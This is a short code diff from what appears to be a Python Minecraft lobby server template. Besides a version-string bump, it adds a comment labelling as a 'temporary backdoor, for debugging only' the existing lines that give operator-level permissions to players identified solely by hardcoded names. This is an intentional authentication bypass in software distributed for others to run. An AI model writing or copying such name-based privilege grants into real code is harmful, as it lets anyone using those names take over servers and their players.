@@ -230,7 +230,7 @@ class MainLogicPart(PartBase):
 				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
 		elif args["message"] == "python.getversion":
 			args["cancel"] = True
-			compMsg.NotifyOneMessage(playerId, "---------\n版本： v0.7b(2025/1):8\n© 2025 联机大厅服务器模板\n本项目采用 GNU General Public License v3.0 许可证。\n---------", "§b")
+			compMsg.NotifyOneMessage(playerId, "---------\n版本： v0.7b(2025/1):9\n© 2025 联机大厅服务器模板\n本项目采用 GNU General Public License v3.0 许可证。\n---------", "§b")
 		elif args["message"] == "python.gettps":
 			args["cancel"] = True
 			if can_use_key == 1:
@@ -282,6 +282,7 @@ class MainLogicPart(PartBase):
 			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
 		elif args["name"] == "渡鸦哥与陌生人":
 			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
+		# 临时后门，仅用于调试
 
 	def OnClientLoadAddonsFinishServerEvent(self, args):
 		playername = CFServer.CreateName(args["playerId"]).GetName()
